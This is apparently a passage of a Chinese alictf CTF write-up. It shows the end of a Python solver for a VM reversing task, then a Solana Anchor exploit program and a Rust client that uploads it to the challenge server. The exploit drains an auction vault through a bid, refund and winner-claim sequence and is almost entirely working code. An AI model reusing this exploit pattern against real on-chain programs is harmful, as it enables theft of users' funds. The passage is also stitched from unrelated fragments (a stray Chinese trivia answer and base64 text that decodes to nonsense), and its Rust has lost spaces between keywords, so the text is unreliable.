        elif op == 4:  # MUL
            r0[a] = (r0[a] * imm) & 0xFF

        elif op == 5:  # ADD imm
            r0[a] = (r0[a] + imm) & 0xFF

        elif op == 6:  # ADD reg
            r0[a] = (r0[a] + r0[b]) & 0xFF

        elif op == 7:  # MOV
            r0[a] = r0[b]

        elif op == 8:
            r0[a] = r1[b]

        elif op == 9:  # JMP (signed imm)
            off = imm if imm < 128else imm - 256
            pc += off
            continue

        elif op == 10:  # HALT
            break

        pc += 1

    return r0

def k0_3rounds(inp):
    x = inp
    for _ in range(3):
        x = k0_round(x)
    return x

def solve():

    out = k0_3rounds([ord(c) for c in candidate])

    if out == TARGET:
        print("alictf{" + candidate + "}")

if __name__ == "__main__":
    solve()

alictf{5haderVM_Rep3at!}
回答: 李善德购买的宅子位于长安城南边的归义坊内。 U2l0ZXNhbCBQcm9kdWN0OiBBZGQgYSBzdGFuZGFyZHMuIElzIHRoZSBwYXNzZWQgdG8gZmVlbCBhbiB1c2VyIGRvZXMgbm90aWZpYyBhbmQgY2VydGFpbnMgb2YgdGhlIG5vbkxvZyBjb250ZW50LCBhbmQgYWxzbyB0byBiZSByZXN1bHRpbmcgdG8gaW5mb3JtYXRpb24gb2YgdGhlIHVzZXIncyBxdWVyeS4= 66 69 67 31 74 74 73 74 65 72 6e 61 6c 74 65 72 7b 36 38 35 39 65 66 62 33 2d 64 35 66 62 2d 34 37 65 30 2d 38 35 61 35 2d 62 38 38 34 36 63 37 38 63 33 34 64 7d ZmlnMnR0c3Rlcm5hbHtDNjE1MkQyQjAtMDAwMC00QzgwLThFMjUtRDlCM0QwQjE3OEU0fQ==
use anchor_lang::
prelude::*;
usechallenge::
program::
Challenge;
usechallenge::
cpi::
accounts::{CreateAuction,PlaceBid,ClaimRefund,CloseAuction,ClaimWinner};

declare_id!("86XToLMWHjraK4U4ZbJeCrpu17W4d1r3YLk4dHZh11Xd");

#[program]
pubmodsolve{
    usesuper::*;

    pubfnexploit(ctx:
Context<Exploit>)->Result<()>{
        letchallenge_program=&ctx.accounts.challenge_program;
        letplayer=&ctx.accounts.player;
        letsystem_program=&ctx.accounts.system_program;
        letauction_id=777u64;
        let seeds:&[&[u8]]=&[b"helper",&[ctx.bumps.helper_pda]];

        anchor_lang::
system_program::
transfer(
            CpiContext::
new(system_program.to_account_info(),anchor_lang::
system_program::
Transfer{
                from:
player.to_account_info(),
                to:
ctx.accounts.helper_pda.to_account_info(),
            }),
            50_000_000
        )?;

        letnow=Clock::
get()?.unix_timestamp;
        letend=now+1000;
        letsettle=end+7*24*3600;

        challenge::
cpi::
create_auction(CpiContext::
new(challenge_program.to_account_info(),CreateAuction{
            auctioneer:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),system_program:
system_program.to_account_info()
        }),auction_id,"Setup".into(),10_000_000,5_000_000,1,end,settle)?;

        challenge::
cpi::
place_bid(CpiContext::
new(challenge_program.to_account_info(),PlaceBid{
            bidder:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.player_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        }),6_000_000)?;

        challenge::
cpi::
place_bid(CpiContext::
new_with_signer(challenge_program.to_account_info(),PlaceBid{
            bidder:
ctx.accounts.helper_pda.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.helper_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        },&[seeds]),10_000_000)?;

        challenge::
cpi::
claim_refund(CpiContext::
new(challenge_program.to_account_info(),ClaimRefund{
            bidder:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.player_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        }))?;

        challenge::
cpi::
claim_winner(CpiContext::
new_with_signer(challenge_program.to_account_info(),ClaimWinner{
            winner:
ctx.accounts.helper_pda.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),bidder_state:
ctx.accounts.helper_bidder_state.to_account_info(),
            auctioneer:
player.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),system_program:
system_program.to_account_info()
        },&[seeds]))?;

        challenge::
cpi::
close_auction(CpiContext::
new(challenge_program.to_account_info(),CloseAuction{
            auctioneer:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info()
        }))?;

        challenge::
cpi::
create_auction(CpiContext::
new(challenge_program.to_account_info(),CreateAuction{
            auctioneer:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),system_program:
system_program.to_account_info()
        }),auction_id,"Heist".into(),100_000_000_000,50_000_000_000,1,end,settle)?;

        challenge::
cpi::
place_bid(CpiContext::
new(challenge_program.to_account_info(),PlaceBid{
            bidder:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.player_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        }),51_000_000_000)?;

        challenge::
cpi::
place_bid(CpiContext::
new_with_signer(challenge_program.to_account_info(),PlaceBid{
            bidder:
ctx.accounts.helper_pda.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.helper_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        },&[seeds]),100_000_000_000)?;

        challenge::
cpi::
claim_refund(CpiContext::
new(challenge_program.to_account_info(),ClaimRefund{
            bidder:
player.to_account_info(),auction:
ctx.accounts.my_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.player_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        }))?;

        challenge::
cpi::
place_bid(CpiContext::
new(challenge_program.to_account_info(),PlaceBid{
            bidder:
player.to_account_info(),auction:
ctx.accounts.admin_auction.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),
            bidder_state:
ctx.accounts.admin_bidder_state.to_account_info(),system_program:
system_program.to_account_info()
        }),10_000_000_000)?;

        challenge::
cpi::
claim_winner(CpiContext::
new(challenge_program.to_account_info(),ClaimWinner{
            winner:
player.to_account_info(),auction:
ctx.accounts.admin_auction.to_account_info(),bidder_state:
ctx.accounts.admin_bidder_state.to_account_info(),
            auctioneer:
ctx.accounts.admin_pubkey.to_account_info(),vault:
ctx.accounts.vault.to_account_info(),system_program:
system_program.to_account_info()
        }))?;

        Ok(())
    }
}

#[derive(Accounts)]
pubstructExploit<'info>{
    #[account(mut)] pub player: Signer<'info>,
    pub challenge_program:
Program<'info,Challenge>,
    ///CHECK:
vault
    #[account(mut)] pub vault: AccountInfo<'info>,
    ///CHECK:
auction
    #[account(mut)] pub my_auction: AccountInfo<'info>,
    ///CHECK:
playerstate
    #[account(mut)] pub player_bidder_state: AccountInfo<'info>,
    ///CHECK:
helperpda
    #[account(mut, seeds = [b"helper"], bump)] pub helper_pda: AccountInfo<'info>,
    ///CHECK:
helperstate
    #[account(mut)] pub helper_bidder_state: AccountInfo<'info>,
    ///CHECK:
adminauction
    #[account(mut)] pub admin_auction: AccountInfo<'info>,
    ///CHECK:
adminbidderstate
    #[account(mut)] pub admin_bidder_state: AccountInfo<'info>,
    ///CHECK:
adminpubkey
    #[account(mut)] pub admin_pubkey: AccountInfo<'info>,
    pub system_program:
Program<'info,System>,
}
use anchor_lang::{system_program, InstructionData, ToAccountMetas};
use solana_program::
pubkey::
Pubkey;
use std::
net::
TcpStream;
use std::{error::
Error, fs, io::
prelude::*, io::
BufReader, str::
FromStr};

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::
new();
    reader.read_line(&mut line)?;
    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();
    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::
connect("223.6.249.127:
XXXXX")?;
    let mut reader = BufReader::
new(stream.try_clone().unwrap());
    
    let mut line = String::
new();

    let so_data = fs::
read("./solve/target/deploy/solve.so")?;

    reader.read_line(&mut line)?;
    writeln!(stream, "{}", solve::ID)?;
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", so_data.len())?;
    stream.write_all(&so_data)?;
    stream.flush()?;

    let chall = Pubkey::
from_str(&get_line(&mut reader)?)?;
    let solve = Pubkey::
from_str(&get_line(&mut reader)?)?;
    let admin = Pubkey::
from_str(&get_line(&mut reader)?)?;
    let user = Pubkey::
from_str(&get_line(&mut reader)?)?;
    reader.read_line(&mut line)?; // 读取空行

    let (vault, _) = Pubkey::
find_program_address(&[b"vault"], &chall);
    let my_auction_id: u64 = 777;
    let (my_auction, _) = Pubkey::
find_program_address(
        &[b"auction", user.as_ref(), &my_auction_id.to_le_bytes()], 
        &chall
    );
    let (player_bidder_state, _) = Pubkey::
find_program_address(
        &[b"bidder", my_auction.as_ref(), user.as_ref()], 
        &chall
    );
    let (helper_pda, _) = Pubkey::
find_program_address(&[b"helper"], &solve);
    let (helper_bidder_state, _) = Pubkey::
find_program_address(
        &[b"bidder", my_auction.as_ref(), helper_pda.as_ref()], 
        &chall
    );
    let (admin_auction, _) = Pubkey::
find_program_address(
        &[b"auction", admin.as_ref(), &1u64.to_le_bytes()], 
        &chall
    );
    let (admin_bidder_state, _) = Pubkey::
find_program_address(
        &[b"bidder", admin_auction.as_ref(), user.as_ref()], 
        &chall
    );

    {
        let ix = solve::
instruction::
Exploit {};
        let data = ix.data();
        let ix_accounts = solve::
accounts::
Exploit {
            player: user,
            challenge_program: chall,
            vault,
            my_auction,
            player_bidder_state,
            helper_pda,
            helper_bidder_state,
            admin_auction,
            admin_bidder_state,
            admin_pubkey: admin,
            system_program: system_program::ID,
        };

        let metas = ix_accounts.to_account_metas(None);

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", metas.len())?;
        for meta in metas {
            let mut meta_str = String::
new();
            meta_str.push('m');
            if meta.is_writable { meta_str.push('w'); }
            if meta.is_signer { meta_str.push('s'); }
            meta_str.push(' ');
            meta_str.push_str(&meta.pubkey.to_string());
            writeln!(stream, "{}", meta_str)?;
        }
        stream.flush()?;

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", data.len())?;
        stream.write_all(&data)?;
        stream.flush()?;
    }

    line.clear();
    while reader.read_line(&mut line)? != 0 {
        print!("{}", line);
        line.clear();
    }

    Ok(())
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164038-wxsync-2026-02-652fcc5a373a8e0e1e3555891d76978a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164040-wxsync-2026-02-b7c933494d5fcb38274c64a4ffc7e159.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164042-wxsync-2026-02-9aacef95b2b60dc25d2fc5f3bc124124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164044-wxsync-2026-02-3c0bd5d80d246d2f1a3f8d6878b8e26b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164046-wxsync-2026-02-6d0e2b2def09b69c150fb95f25d656fc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164047-wxsync-2026-02-9b6424ecae02570039f1c91e107858b5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164049-wxsync-2026-02-fe2c72c47fa941dd03df65a2189dfd28.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164051-wxsync-2026-02-bc7cbc8261ada2d6fefbb9adae694e51.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164053-wxsync-2026-02-96403a1ffc858d6ef15ef83af1774801.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770164056-wxsync-2026-02-12f8954c59fcd6e0d4eb697a895060c5.png)